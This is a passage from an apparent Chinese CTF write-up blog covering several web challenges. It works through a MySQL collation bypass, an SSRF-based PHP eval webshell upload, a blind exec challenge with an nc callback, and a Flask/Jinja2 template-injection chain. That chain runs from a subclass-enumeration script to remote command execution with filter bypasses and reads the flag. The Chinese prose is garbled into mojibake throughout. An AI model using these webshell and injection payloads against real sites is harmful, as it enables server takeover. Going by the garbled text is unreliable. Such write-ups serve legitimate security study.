è®¿é—®å…¶ä¸­çš„ä¸€ä¸ªå¤‡ä»½æ–‡ä»¶å¯ä»¥å¾—åˆ°ä»¥ä¸Šä»£ç ï¼šè¾“å…¥usern3meä¸èƒ½ç­‰äºBctf2o16ï¼Œå¦‚æœç­‰äºå°±ä¼šç›´æ¥è®©name=fuckï¼ŒæŸ¥è¯¢çš„æ—¶å€™è‚¯å®šæ˜¯å‡ºé”™çš„ï¼Œé‚£ä¹ˆè¿™é‡Œè¦è®©usern3meç­‰äºä»€ä¹ˆå‘¢ï¼Ÿè‚¯å®šå°±æ˜¯Bctf2o16å§ï¼Œæ‰€ä»¥è¦å¦‚ä½•ç»•è¿‡å‘¢ï¼Ÿ mysqlå­—ç¬¦é›†mysqlä¸­æœ‰ä¸¤ç§å­—ç¬¦é›†ç¼–ç ï¼šä½¿ç”¨utf8_general_ciå’Œutf8_unicode_ciä¸¤ç§ æ ¡å¯¹è§„åˆ™ä¸‹é¢çš„æ¯”è¾ƒç›¸ç­‰ï¼šÃ„ = Aã€Ã– = Oã€Ãœ = Uï¼Œå‚è€ƒï¼šhttps://blog.csdn.net/lovemysea/article/details/79074759æ‰€ä»¥è¿™é‡Œæƒ³è¦ç»•è¿‡ï¼Œç›´æ¥ä¼ Bctf2Ã–16å³å¯ï¼š 1/5211ec9dde53ee65bb02225117fba1e1.php?usern3me=Bctf2Ã–16 123456789101112131415161718192021&lt;?phpif(isset($_GET['path']) &amp;&amp; isset($_GET['filename'])){ $path = $_GET['path']; $name = &quot;upload/&quot;.$_GET['filename'];}else{ show_source(__FILE__); exit();}if(strpos($name,'..') &gt; -1){ echo 'WTF'; exit();}if(strpos($path,'http://127.0.0.1/') === 0){ file_put_contents($name,file_get_contents($path));}else{ echo 'path error';}?&gt; å¾—åˆ°æ–°çš„phpä»£ç ï¼šgetä¸€ä¸ªpathå’Œfilenameä¸ä¸ºç©ºçš„è¯åˆ†åˆ«å¤åˆ¶ç»™pathå’Œnameï¼Œç„¶ånameå½“ä¸­çš„â€™..â€™å¤§äº-1ï¼Œå°±è¾“å‡ºWTFå¯¼è‡´é€€å‡ºï¼Œæ„æ€æ˜¯æœ«å°¾å¿…é¡»æœ‰ä¸¤ä¸ª..å—ï¼Ÿç„¶åæ¥ä¸‹æ¥å¦‚æœåœ¨pathä¸­æˆªå–çš„ä½ç½®æˆªå–é‚£ä¸ªåœ°å€æ˜¯åœ¨å¼€å¤´ï¼Œé‚£ä¹ˆå°±å°†pathçš„å†…å®¹å†™å…¥nameä¸­ã€‚æˆ‘çš„æ€è·¯æ˜¯è¿™æ ·çš„è®©nameä¸ºphpæ–‡ä»¶ï¼Œç„¶åå†™å…¥çš„pathå°±ç›´æ¥æ˜¯ç³»ç»Ÿå‘½ä»¤æˆ–è€…ä¸€å¥è¯æœ¨é©¬ï¼Œæ¥ä¸‹æ¥çœ‹äº†ä¸€ä¸‹wpå‘ç°æ€è·¯æ˜¯è¿™æ ·çš„ï¼Œä½†æ˜¯æ²¡é‚£ä¹ˆå®¹æ˜“ç°åœ¨æœ¬åœ°æ¨¡æ‹Ÿä¸€ä¸‹æ„Ÿå—ä¸€ä¸‹å§:1.åŠ ä¸Šhttp://127.0.0.1/è¿™ä¸ªå‰ç¼€åæœ‰ä»€ä¹ˆåŒºåˆ«ï¼Ÿæ²¡åŠ ä¸Šå‰ç¼€å‰ï¼Œè®¿é—®çš„å°±æ˜¯æœ¬åœ°æ–‡ä»¶ç³»ç»Ÿï¼Œç›¸å½“äºç›´æ¥è®¿é—®æºç ï¼Œåœ¨ä¸Šè¿°ä»£ç ä¸­ï¼Œpathä¸­çš„å†…å®¹ä¼šç›´æ¥è¢«å†™å…¥nameä¸­ï¼Œä¹Ÿå°±æ˜¯pathä¸­çš„æºç ï¼ŒåŠ äº†å‰ç¼€ï¼Œå†™å…¥nameä¸­çš„å†…å®¹å°±æ˜¯åœ¨urlä¸­æ‰§è¡Œä»¥åçš„å†…å®¹2.ä¸ºå•¥è¿™é‡Œè¦åˆ©ç”¨é‚£ä¸ªä¼ å…¥usern3meçš„phpæ–‡ä»¶ï¼Ÿfile_get_contents() å‡½æ•°æŠŠæ•´ä¸ªæ–‡ä»¶è¯»å…¥ä¸€ä¸ªå­—ç¬¦ä¸²ä¸­ï¼Œæ‰€ä»¥è¿™é‡Œéœ€è¦çš„æ˜¯ä¸€ä¸ªæ–‡ä»¶ï¼Œæ‰€ä»¥éœ€è¦åˆ©ç”¨é‚£ä¸ªæ–‡ä»¶ã€‚åœ¨è¿™é‡Œæ„é€ ä¸€ä¸‹payloadå†ç»§ç»­ç†æ¸…æ¥šä¸€ä¸‹: 1/c3368f5eb5f8367fd548b228bee69ef2.php?filename=a.php&amp;path=http://127.0.0.1/5211ec9dde53ee65bb02225117fba1e1.php?usern3me=&lt;?php eval($_POST[a]);?&gt; å› ä¸ºä¼ å…¥çš„æ˜¯urlè¯»å–ä»¥åçš„ç»“æœï¼Œä¹Ÿå°±æ˜¯ä»£ç è¢«æ‰§è¡Œä»¥åçš„åŠŸèƒ½ï¼Œæ­¤æ—¶a.phpå°†ä¼šè¾“å‡ºhelloï¼Œä»¥åŠä¸€å¥è¯æœ¨é©¬ä¼šè¢«è§£æï¼Œè¿™ä¸ªåœ°æ–¹éœ€è¦ç†è§£ä¸€ä¸‹ã€‚PSï¼šç”±äºfile_file_get_contentsç›¸å½“äºè®¿é—®ä¸€æ¬¡urlè·å–å…¶ä¸­çš„å†…å®¹æ‰€ä»¥éœ€è¦å¯¹é‡Œé¢çš„ç©ºæ ¼è¿›è¡ŒäºŒæ¬¡urlencode,æ¥ä¸‹æ¥è¢«è§£ç åæ‰ä¼šæ˜¯ç©ºæ ¼ç”¨èšå‰‘è¿æ¥a.php å³å¯æ‹¿åˆ°flag flag{e034f45b-464a-42bb-a262-1635c08f30bf} WEBâ€”â€”execä¸€å¼€å§‹çœ‹äº†å¾ˆä¹…æ²¡å•¥çªç ´ï¼Œäºæ˜¯çœ‹äº†ä¸€ä¸‹wpï¼ŒåŸæ¥çªç ´å£åœ¨è¿™é‡Œæ‰¾åˆ°ç­”æ¡ˆè¯´ï¼Œç”¨vimç¼–è¾‘æ–‡æœ¬xxx.phpä¸­é€”é€€å‡ºï¼Œä¼šè‡ªåŠ¨åˆ›å»ºä¸€ä¸ªæ–‡ä»¶.xxx.php.swpã€‚ç„¶åæˆ‘ä»¬ä¸‹è½½è¿™ä¸ªæ–‡ï¼Œè¿™é‡Œåº”è¯¥å°±æ˜¯.index.php.swpæºç æ³„éœ²ï¼Œä¸‹è½½ä¸‹æ¥çœ‹çœ‹ ä½¿ç”¨ vim -r åŠ ä¸Šé‚£ä¸ªæ–‡ä»¶å°±èƒ½è¿˜åŸæºç ï¼Œæ¥ä¸‹æ¥çœ‹çœ‹è¿™æ®µæºç å§ä¼šgetä¸€ä¸ªsignå¹¶ä½¿ç”¨checkå‡½æ•°æ¯ä¸€ä¸ªæ•°å­—çš„å€¼éƒ½ä¸èƒ½å†1-9ä¹‹é—´ï¼Œçœ‹äº†ä¸€ä¸‹wpï¼Œæ‰€ä»¥è¿™é‡Œè¦ä¸Šä¼ ä¸€ä¸ªåå…­è¿›åˆ¶çš„æ•°å­—å³å¯ç»•è¿‡å¦‚ï¼š0xabcdefå¾€ä¸‹çœ‹ï¼Œæ¥ä¸‹æ¥éœ€è¦postä¸€ä¸ªcmdï¼Œä¼šä½¿ç”¨execæ‰§è¡Œï¼šä½†æ˜¯æ‰§è¡Œç»“æœä¸ä¼šè¢«è¾“å‡ºï¼Œé‚£è¯¥å’‹åŠï¼Ÿçœ‹äº†ä¸€ä¸‹wp:è¿˜è®°å¾—ä¹‹å‰çš„é‡å®šå‘ç¬¦å·å—ï¼Œåœ¨è¿™é‡Œæˆ‘ä»¬å°±æ˜¯è¦è¿™ä¹ˆåˆ©ç”¨ï¼Œåœ¨ä¸¤å¤©æœåŠ¡å™¨ä¸­ä½¿ç”¨ncå‘½ä»¤å»ºç«‹è¿æ¥ï¼Œä½¿å¾—è¢«æ”»å‡»è€…æœåŠ¡å™¨çš„å†…å®¹é‡å®šå‘è¾“å‡ºè‡³æ”»å‡»è€…æœåŠ¡å™¨:ç°åœ¨æˆ‘ä¹‹å‰ä¹°çš„å…¬ç½‘æœåŠ¡å™¨ä¸Šç›‘å¬:ç”¨äº†æ‰€æœ‰çš„æŒ‡ä»¤éƒ½æ²¡æˆåŠŸæ˜¯ä»€ä¹ˆé¬¼== webâ€”â€”fuzzæ£€æŸ¥å®Œåå° æœ‰ä¸€ä¸ªrobots.txtæ–‡ä»¶æŸ¥çœ‹æºç ï¼šï¼Œæœ‰ä¸€ä¸²ç»è¿‡base64ç¼–ç è¿‡çš„å†…å®¹ï¼Œå°†å…¶è§£ç çœ‹ï¼š burpsuitæŠ“åŒ…éƒ½æ²¡æ‹¿åˆ°æœ‰ç”¨ä¿¡æ¯ï¼Ÿå¯èƒ½æ˜¯æˆ‘å¤ªèœäº†å§ï¼Œäºæ˜¯å»çœ‹wpï¼šä»–æ˜¯è®©æˆ‘ä»¬fuzz parameterå°±æ˜¯ä¼ å‚çš„å‚æ•°åï¼Œä¸€å¼€å§‹æˆ‘å°è¯•äº†å‡ ä¸ªï¼Œå› ä¸ºæ²¡æœ‰å­—å…¸å¯ä»¥çˆ†ç ´å°±æ”¾å¼ƒäº†ï¼Œæ²¡æƒ³åˆ°è¿˜çœŸæ˜¯è¦è¿™ä¹ˆçŒœï¼Œå½“ä¼ å…¥?nameçš„æ—¶å€™ç½‘é¡µçš„å›æ˜¾å‘ç”Ÿäº†å˜åŒ–ï¼š çœ‹åˆ°é‚£åªå¤§èŸ’è›‡ï¼Œåˆçœ‹åˆ°è¿™ä¸ªç•Œé¢â€”â€”python sstiæ³¨å…¥å°è¯•payload: 1?name={{10*10}} é¡µé¢è¿”å›excuseï¼Œå¥½åƒæœ‰ä»€ä¹ˆè¢«è¿‡æ»¤äº†ï¼Œå†å°è¯•10-10ï¼Œé¡µé¢å›æ˜¾hello 0ï¼Œç¡®å®šè¿‡æ»¤*å·ï¼Œæ¥ä¸‹æ¥ä½¿ç”¨ï¼š 1{{&quot;&quot;.__class__.__mro__[1]}} é¡µé¢å›æ˜¾çš„ä¸æ˜¯objectç±»ï¼Œäºæ˜¯æ›´æ¢å‚æ•°ï¼š 1{{&quot;&quot;.__class__.__mro__[2]}} 1{{&quot;&quot;.__class__.__mro__[2].__subclasses__()}}#æ˜¾ç¤ºæ‰€æœ‰å­ç±» 1[&lt;type 'type'&gt;, &lt;type 'weakref'&gt;, &lt;type 'weakcallableproxy'&gt;, &lt;type 'weakproxy'&gt;, &lt;type 'int'&gt;, &lt;type 'basestring'&gt;, &lt;type 'bytearray'&gt;, &lt;type 'list'&gt;, &lt;type 'NoneType'&gt;, &lt;type 'NotImplementedType'&gt;, &lt;type 'traceback'&gt;, &lt;type 'super'&gt;, &lt;type 'xrange'&gt;, &lt;type 'dict'&gt;, &lt;type 'set'&gt;, &lt;type 'slice'&gt;, &lt;type 'staticmethod'&gt;, &lt;type 'complex'&gt;, &lt;type 'float'&gt;, &lt;type 'buffer'&gt;, &lt;type 'long'&gt;, &lt;type 'frozenset'&gt;, &lt;type 'property'&gt;, &lt;type 'memoryview'&gt;, &lt;type 'tuple'&gt;, &lt;type 'enumerate'&gt;, &lt;type 'reversed'&gt;, &lt;type 'code'&gt;, &lt;type 'frame'&gt;, &lt;type 'builtin_function_or_method'&gt;, &lt;type 'instancemethod'&gt;, &lt;type 'function'&gt;, &lt;type 'classobj'&gt;, &lt;type 'dictproxy'&gt;, &lt;type 'generator'&gt;, &lt;type 'getset_descriptor'&gt;, &lt;type 'wrapper_descriptor'&gt;, &lt;type 'instance'&gt;, &lt;type 'ellipsis'&gt;, &lt;type 'member_descriptor'&gt;, &lt;type 'file'&gt;, &lt;type 'PyCapsule'&gt;, &lt;type 'cell'&gt;, &lt;type 'callable-iterator'&gt;, &lt;type 'iterator'&gt;, &lt;type 'sys.long_info'&gt;, &lt;type 'sys.float_info'&gt;, &lt;type 'EncodingMap'&gt;, &lt;type 'fieldnameiterator'&gt;, &lt;type 'formatteriterator'&gt;, &lt;type 'sys.version_info'&gt;, &lt;type 'sys.flags'&gt;, &lt;type 'exceptions.BaseException'&gt;, &lt;type 'module'&gt;, &lt;type 'imp.NullImporter'&gt;, &lt;type 'zipimport.zipimporter'&gt;, &lt;type 'posix.stat_result'&gt;, &lt;type 'posix.statvfs_result'&gt;, &lt;class 'warnings.WarningMessage'&gt;, &lt;class 'warnings.catch_warnings'&gt;, &lt;class '_weakrefset._IterationGuard'&gt;, &lt;class '_weakrefset.WeakSet'&gt;, &lt;class '_abcoll.Hashable'&gt;, &lt;type 'classmethod'&gt;, &lt;class '_abcoll.Iterable'&gt;, &lt;class '_abcoll.Sized'&gt;, &lt;class '_abcoll.Container'&gt;, &lt;class '_abcoll.Callable'&gt;, &lt;class 'site._Printer'&gt;, &lt;class 'site._Helper'&gt;, &lt;type '_sre.SRE_Pattern'&gt;, &lt;type '_sre.SRE_Match'&gt;, &lt;type '_sre.SRE_Scanner'&gt;, &lt;class 'site.Quitter'&gt;, &lt;class 'codecs.IncrementalEncoder'&gt;, &lt;class 'codecs.IncrementalDecoder'&gt;, &lt;type 'operator.itemgetter'&gt;, &lt;type 'operator.attrgetter'&gt;, &lt;type 'operator.methodcaller'&gt;, &lt;type 'functools.partial'&gt;, &lt;type 'itertools.combinations'&gt;, &lt;type 'itertools.combinations_with_replacement'&gt;, &lt;type 'itertools.cycle'&gt;, &lt;type 'itertools.dropwhile'&gt;, &lt;type 'itertools.takewhile'&gt;, &lt;type 'itertools.islice'&gt;, &lt;type 'itertools.starmap'&gt;, &lt;type 'itertools.imap'&gt;, &lt;type 'itertools.chain'&gt;, &lt;type 'itertools.compress'&gt;, &lt;type 'itertools.ifilter'&gt;, &lt;type 'itertools.ifilterfalse'&gt;, &lt;type 'itertools.count'&gt;, &lt;type 'itertools.izip'&gt;, &lt;type 'itertools.izip_longest'&gt;, &lt;type 'itertools.permutations'&gt;, &lt;type 'itertools.product'&gt;, &lt;type 'itertools.repeat'&gt;, &lt;type 'itertools.groupby'&gt;, &lt;type 'itertools.tee_dataobject'&gt;, &lt;type 'itertools.tee'&gt;, &lt;type 'itertools._grouper'&gt;, &lt;type 'cStringIO.StringO'&gt;, &lt;type 'cStringIO.StringI'&gt;, &lt;class 'string.Template'&gt;, &lt;class 'string.Formatter'&gt;, &lt;type 'collections.deque'&gt;, &lt;type 'deque_iterator'&gt;, &lt;type 'deque_reverse_iterator'&gt;, &lt;type '_thread._localdummy'&gt;, &lt;type 'thread._local'&gt;, &lt;type 'thread.lock'&gt;, &lt;type 'datetime.date'&gt;, &lt;type 'datetime.timedelta'&gt;, &lt;type 'datetime.time'&gt;, &lt;type 'datetime.tzinfo'&gt;, &lt;class 'werkzeug._internal._Missing'&gt;, &lt;class 'werkzeug._internal._DictAccessorProperty'&gt;, &lt;type 'time.struct_time'&gt;, &lt;class 'email.LazyImporter'&gt;, &lt;type 'Struct'&gt;, &lt;type '_hashlib.HASH'&gt;, &lt;type '_random.Random'&gt;, &lt;class 'socket._closedsocket'&gt;, &lt;type '_socket.socket'&gt;, &lt;type 'method_descriptor'&gt;, &lt;class 'socket._socketobject'&gt;, &lt;class 'socket._fileobject'&gt;, &lt;class 'urlparse.ResultMixin'&gt;, &lt;class 'calendar.Calendar'&gt;, &lt;type '_io._IOBase'&gt;, &lt;type '_io.IncrementalNewlineDecoder'&gt;, &lt;class 'werkzeug.datastructures.ImmutableListMixin'&gt;, &lt;class 'werkzeug.datastructures.ImmutableDictMixin'&gt;, &lt;class 'werkzeug.datastructures.UpdateDictMixin'&gt;, &lt;class 'werkzeug.datastructures._omd_bucket'&gt;, &lt;class 'werkzeug.datastructures.Headers'&gt;, &lt;class 'werkzeug.datastructures.ImmutableHeadersMixin'&gt;, &lt;class 'werkzeug.datastructures.HeaderSet'&gt;, &lt;class 'werkzeug.datastructures.ETags'&gt;, &lt;class 'werkzeug.datastructures.IfRange'&gt;, &lt;class 'werkzeug.datastructures.Range'&gt;, &lt;class 'werkzeug.datastructures.ContentRange'&gt;, &lt;class 'werkzeug.datastructures.FileStorage'&gt;, &lt;class 'werkzeug.urls.Href'&gt;, &lt;class 'werkzeug.wsgi.SharedDataMiddleware'&gt;, &lt;class 'werkzeug.wsgi.DispatcherMiddleware'&gt;, &lt;class 'werkzeug.wsgi.ClosingIterator'&gt;, &lt;class 'werkzeug.wsgi.FileWrapper'&gt;, &lt;class 'werkzeug.wsgi.LimitedStream'&gt;, &lt;class 'werkzeug.formparser.FormDataParser'&gt;, &lt;class 'werkzeug.formparser.MultiPartParser'&gt;, &lt;class 'werkzeug.utils.HTMLBuilder'&gt;, &lt;class 'werkzeug.wrappers.BaseRequest'&gt;, &lt;class 'werkzeug.wrappers.BaseResponse'&gt;, &lt;class 'werkzeug.wrappers.AcceptMixin'&gt;, &lt;class 'werkzeug.wrappers.ETagRequestMixin'&gt;, &lt;class 'werkzeug.wrappers.UserAgentMixin'&gt;, &lt;class 'werkzeug.wrappers.AuthorizationMixin'&gt;, &lt;class 'werkzeug.wrappers.StreamOnlyMixin'&gt;, &lt;class 'werkzeug.wrappers.ETagResponseMixin'&gt;, &lt;class 'werkzeug.wrappers.ResponseStream'&gt;, &lt;class 'werkzeug.wrappers.ResponseStreamMixin'&gt;, &lt;class 'werkzeug.wrappers.CommonRequestDescriptorsMixin'&gt;, &lt;class 'werkzeug.wrappers.CommonResponseDescriptorsMixin'&gt;, &lt;class 'werkzeug.wrappers.WWWAuthenticateMixin'&gt;, &lt;class 'werkzeug.exceptions.Aborter'&gt;, &lt;class 'threading._Verbose'&gt;, &lt;type 'cPickle.Unpickler'&gt;, &lt;type 'cPickle.Pickler'&gt;, &lt;class 'jinja2.utils.MissingType'&gt;, &lt;class 'jinja2.utils.LRUCache'&gt;, &lt;class 'jinja2.utils.Cycler'&gt;, &lt;class 'jinja2.utils.Joiner'&gt;, &lt;class 'markupsafe._MarkupEscapeHelper'&gt;, &lt;class 'jinja2.nodes.EvalContext'&gt;, &lt;class 'jinja2.runtime.TemplateReference'&gt;, &lt;class 'jinja2.nodes.Node'&gt;, &lt;class 'jinja2.runtime.Context'&gt;, &lt;class 'jinja2.runtime.BlockReference'&gt;, &lt;class 'jinja2.runtime.LoopContext'&gt;, &lt;class 'jinja2.runtime.LoopContextIterator'&gt;, &lt;class 'jinja2.runtime.Macro'&gt;, &lt;class 'jinja2.runtime.Undefined'&gt;, &lt;class 'numbers.Number'&gt;, &lt;class 'decimal.Decimal'&gt;, &lt;class 'decimal._ContextManager'&gt;, &lt;class 'decimal.Context'&gt;, &lt;class 'decimal._WorkRep'&gt;, &lt;class 'decimal._Log10Memoize'&gt;, &lt;type '_ast.AST'&gt;, &lt;class 'jinja2.lexer.Failure'&gt;, &lt;class 'jinja2.lexer.TokenStreamIterator'&gt;, &lt;class 'jinja2.lexer.TokenStream'&gt;, &lt;class 'jinja2.lexer.Lexer'&gt;, &lt;class 'jinja2.parser.Parser'&gt;, &lt;class 'jinja2.visitor.NodeVisitor'&gt;, &lt;class 'jinja2.compiler.Identifiers'&gt;, &lt;class 'jinja2.compiler.Frame'&gt;, &lt;class 'jinja2.environment.Environment'&gt;, &lt;class 'jinja2.environment.Template'&gt;, &lt;class 'jinja2.environment.TemplateModule'&gt;, &lt;class 'jinja2.environment.TemplateExpression'&gt;, &lt;class 'jinja2.environment.TemplateStream'&gt;, &lt;class 'jinja2.loaders.BaseLoader'&gt;, &lt;class 'jinja2.bccache.Bucket'&gt;, &lt;class 'jinja2.bccache.BytecodeCache'&gt;, &lt;class 'difflib.HtmlDiff'&gt;, &lt;class 'uuid.UUID'&gt;, &lt;type 'CArgObject'&gt;, &lt;type '_ctypes.CThunkObject'&gt;, &lt;type '_ctypes._CData'&gt;, &lt;type '_ctypes.CField'&gt;, &lt;type '_ctypes.DictRemover'&gt;, &lt;class 'ctypes.CDLL'&gt;, &lt;class 'ctypes.LibraryLoader'&gt;, &lt;class 'werkzeug.routing.RuleFactory'&gt;, &lt;class 'werkzeug.routing.RuleTemplate'&gt;, &lt;class 'werkzeug.routing.BaseConverter'&gt;, &lt;class 'werkzeug.routing.Map'&gt;, &lt;class 'werkzeug.routing.MapAdapter'&gt;, &lt;class 'flask.signals.Namespace'&gt;, &lt;class 'flask.signals._FakeSignal'&gt;, &lt;class 'werkzeug.local.Local'&gt;, &lt;class 'werkzeug.local.LocalStack'&gt;, &lt;class 'werkzeug.local.LocalManager'&gt;, &lt;class 'werkzeug.local.LocalProxy'&gt;, &lt;class 'flask.helpers.locked_cached_property'&gt;, &lt;class 'flask.helpers._PackageBoundObject'&gt;, &lt;type '_json.Scanner'&gt;, &lt;type '_json.Encoder'&gt;, &lt;class 'json.decoder.JSONDecoder'&gt;, &lt;class 'json.encoder.JSONEncoder'&gt;, &lt;class 'itsdangerous._CompactJSON'&gt;, &lt;class 'itsdangerous.SigningAlgorithm'&gt;, &lt;class 'itsdangerous.Signer'&gt;, &lt;class 'itsdangerous.Serializer'&gt;, &lt;class 'itsdangerous.URLSafeSerializerMixin'&gt;, &lt;class 'contextlib.GeneratorContextManager'&gt;, &lt;class 'contextlib.closing'&gt;, &lt;class 'click._compat._FixupStream'&gt;, &lt;class 'click._compat._AtomicFile'&gt;, &lt;class 'click.utils.LazyFile'&gt;, &lt;class 'click.utils.KeepOpenFile'&gt;, &lt;class 'click.types.ParamType'&gt;, &lt;class 'click.parser.Option'&gt;, &lt;class 'click.parser.Argument'&gt;, &lt;class 'click.parser.ParsingState'&gt;, &lt;class 'click.parser.OptionParser'&gt;, &lt;class 'click.formatting.HelpFormatter'&gt;, &lt;class 'click.core.Context'&gt;, &lt;class 'click.core.BaseCommand'&gt;, &lt;class 'click.core.Parameter'&gt;, &lt;class 'flask.cli.DispatchingApp'&gt;, &lt;class 'flask.cli.ScriptInfo'&gt;, &lt;class 'flask.config.ConfigAttribute'&gt;, &lt;class 'flask.ctx._AppCtxGlobals'&gt;, &lt;class 'flask.ctx.AppContext'&gt;, &lt;class 'flask.ctx.RequestContext'&gt;, &lt;class 'flask.sessions.SessionMixin'&gt;, &lt;class 'flask.sessions.TaggedJSONSerializer'&gt;, &lt;class 'flask.sessions.SessionInterface'&gt;, &lt;class 'flask.blueprints.BlueprintSetupState'&gt;, &lt;type 'select.epoll'&gt;, &lt;class 'werkzeug.serving.WSGIRequestHandler'&gt;, &lt;class 'werkzeug.serving._SSLContext'&gt;, &lt;class 'werkzeug.serving.BaseWSGIServer'&gt;, &lt;class 'logging.LogRecord'&gt;, &lt;class 'logging.Formatter'&gt;, &lt;class 'logging.BufferingFormatter'&gt;, &lt;class 'logging.Filter'&gt;, &lt;class 'logging.Filterer'&gt;, &lt;class 'logging.PlaceHolder'&gt;, &lt;class 'logging.Manager'&gt;, &lt;class 'logging.LoggerAdapter'&gt;, &lt;class 'jinja2.debug.TracebackFrameProxy'&gt;, &lt;class 'jinja2.ext.Extension'&gt;, &lt;class 'jinja2.ext._CommentFinder'&gt;, &lt;class 'jinja2.debug.ProcessedTraceback'&gt;] æ‰¾äº†å¾ˆä¹…éƒ½æ²¡æ‰¾åˆ°å¯ä»¥è‡ªåŠ¨å†™ç¼–å·ä»¥åŠæŸ¥æ‰¾ç»“æœçš„è„šæœ¬ï¼Œå¯èƒ½æ˜¯æˆ‘æœç´¢å§¿åŠ¿ä¸å¯¹ï¼Œäºæ˜¯è‡ªå·±å†™äº†ä¸€ä¸ªè‡­çƒ‚ä»£ç ï¼š 123456789101112import requestss=requests.session()url=&quot;http://4282889f587b4157a422f0850b772d399e6c949b99b34289.changame.ichunqiu.com/?name=&quot;choice=[]for i in range(0,301): payload=f&quot;{{{{''.__class__.__mro__[2].__subclasses__()[{i}]}}}}&quot; reponse=(s.get(url+payload).text) print(i,reponse) if &quot;file&quot; in reponse: pass_reponse = [i, reponse] choice.append(pass_reponse)print(choice) æœ€ååªçœ‹åˆ°ä¸€ä¸ª40 &lt;type&gt; flie äºæ˜¯æ„å»ºpayload: 1{{&quot;&quot;.__class__.__mro__[2].__subclasses__()[40]}} fileå¯¹è±¡æ–¹æ³•å‚è€ƒï¼šhttps://www.runoob.com/python/file-methods.html æˆ‘ä»¬ç°åœ¨å¯ä»¥ä½¿ç”¨è¦ä¹ˆå°±æ˜¯è¯»è¦ä¹ˆå°±æ˜¯å†™ï¼Œé™¤æ­¤ä¹‹å¤–æ²¡æœ‰å…¶ä»–åŠæ³•ï¼Œæ‰¾äº†å¥½ä¹…ï¼Œè¿˜æ˜¯çœ‹wpå§ã€‚ã€‚ã€‚ã€‚ 1{{ ''.__class__.__mro__[2].__subclasses__()[40]('/tmp/owned.cfg', 'w').write('from subprocess import check_output\\n\\nRUNCMD = check_output\\n') }} è§£æä¸€ä¸‹ä¸Šé¢è¿™ä¸ªpayloadï¼Œä½¿ç”¨çš„æ˜¯writeçš„å‘½ä»¤ï¼Œå¹¶ä¸”æ˜¯wï¼Œæ„æ€æ˜¯å°†åé¢çš„å†…å®¹å†™å…¥/tmp/owned.cfgè¿™ä¸ªå½“ä¸­ï¼Œæ²¡æœ‰åˆ™åˆ›å»ºæ–°æ–‡ä»¶ã€‚å†™å…¥çš„å†…å®¹æ˜¯ï¼š 123from subprocess import check_outputRUNCMD=check_output#æ‰§è¡Œå¤–éƒ¨å‘½ä»¤å¹¶è·å–ä»–çš„è¾“å‡º æ¥ä¸‹æ¥è¾“å…¥: 1?name={{ config.from_pyfile('/tmp/owned.cfg') }} Flask è¢«è®¾è®¡ä¸ºéœ€è¦é…ç½®æ¥å¯åŠ¨åº”ç”¨ã€‚æ”¾ç½®é…ç½®çš„åœ°æ–¹å³ä¸ºè¿™ä¸ªconfigï¼Œå¦‚æœæ˜¯è¦æ·»åŠ æ–‡ä»¶ä¸­çš„å†…å®¹åˆ™ä¸ºä»¥ä¸Šæ ¼å¼ 1{{ config['RUNCMD']('/usr/bin/id',shell=True) }} æ­¤æ—¶å°±å¯ä»¥æ‰§è¡ŒæŒ‡ä»¤äº† â€˜ â€˜å†…ä¸ºæ”¾ç½®æŒ‡ä»¤çš„åœ°æ–¹ï¼Œshell=trueçš„æ„æ€æ˜¯è®©shellæœ¬èº«çš„ç®¡é“å¯¹äºå—ä¿¡ä»»çš„è¾“å…¥ä»ç„¶æ”¯æŒæ­¤æ—¶è¯¥å‘½ä»¤å¯æ”¹å†™ä¸ºï¼š 1RUNCMD = os.system(&quot;/usr/bin/id&quot;)#ç›¸å½“äºæ˜¯é—´æ¥è°ƒç”¨äº†osæ¨¡å—æ‰§è¡Œç³»ç»Ÿå‘½ä»¤ å‚è€ƒ:https://docs.python.org/zh-cn/3/library/subprocess.html#replacing-bin-sh-shell-command-substitutionæ¥ä¸‹æ¥å°±æ˜¯å¯»æ‰¾flagå¹¶æ‰§è¡Œå³å¯ï¼š 1?name={{ config['RUNCMD']('`echo ` l'+'s /var/www/html/',shell=True) }} è¿™é‡Œæœ‰ä¸¤ä¸ªç‚¹ï¼Œç¬¬ä¸€ä¸ªæ˜¯ç”±äºlsè¢«è¿‡æ»¤ï¼Œæ‰€ä»¥å¯ä»¥é‡‡ç”¨è¿™ä¸­**â€™â€™+â€™â€™çš„æ‹¼æ¥æ–¹å¼è¿›è¡Œç»•è¿‡ï¼Œç„¶å``ä¸¤ä¸ªåå¼•å·çš„ä½œç”¨æ˜¯å¼•ç”¨ç³»ç»Ÿå‘½ä»¤**æˆ‘çœ‹å…¶ä»–payload ä¹Ÿå¯ä»¥é‡‡å–ä½¿ç”¨base64ç¼–ç å†è§£ç çš„å½¢å¼è¿›è¡Œç»•è¿‡ï¼š 1{{ config['RUNCMD']('`echo bHMgLWFsIC92YXIvd3d3L2h0bWwK | base64 -d`',shell=True) }} æ‰¾åˆ°flagçš„ä½ç½®ï¼Œcatä¸€ä¸‹ 1{{ config['RUNCMD']('`echo`cat /var/www/html/fl'+'4g',shell=True) }} è¿™é‡Œå†æä¾›ä¸€ç§æ‹¿åˆ°flagçš„æ–¹æ³•ï¼Œå…¶å®åœ¨å‰é¢ä¹Ÿå·²ç»æè¿‡äº†ï¼šfileç±»ä¸­æœ‰readæ–¹æ³•ï¼šæ‰€ä»¥è¿™é‡Œå…¶å®ä¹Ÿå¯ä»¥å†™æˆï¼š 1{{&quot;&quot;.__class__.__mro__[2].__subclasses__()[40]('/var/www/html/fl'+'4g').read()}} 1Hello flag{f0551e10-7ebe-45a0-be51-0d103fc0400b}","link":"/2021/02/25/i%E6%98%A5%E7%A7%8B9/"},{"title":"sstiæ³¨å…¥ç»­()","text":"å‰è¨€ï¼šä¹‹å‰ç†è§£çš„sstiæ³¨å…¥ä¸€ç›´ä»¥ä¸ºæ˜¯pythonæ‰æœ‰çš„ï¼Œåæ¥å‘ç°å¹¶ä¸æ˜¯çš„ï¼Œåº”è¯¥è¯´æ˜¯æœåŠ¡å™¨ç«¯æ¨¡æ¿æ³¨å…¥ï¼Œå‡¡æ˜¯ä½¿ç”¨æ¨¡æ¿çš„åœ°æ–¹éƒ½æœ‰å¯èƒ½å‡ºç°sstiæ³¨å…¥ï¼ï¼ æ¨¡æ¿æ³¨å…¥æ”»å‡»æ­¥éª¤ç¡®å®šæ¨¡æ¿ç±»å‹â€”â€”&gt;é€‰æ‹©å¯¹åº”æ”»å‡»è¯­å¥ å¸¸è§æ¨¡æ¿å¼•æ“1.php å¸¸ç”¨çš„Smarty 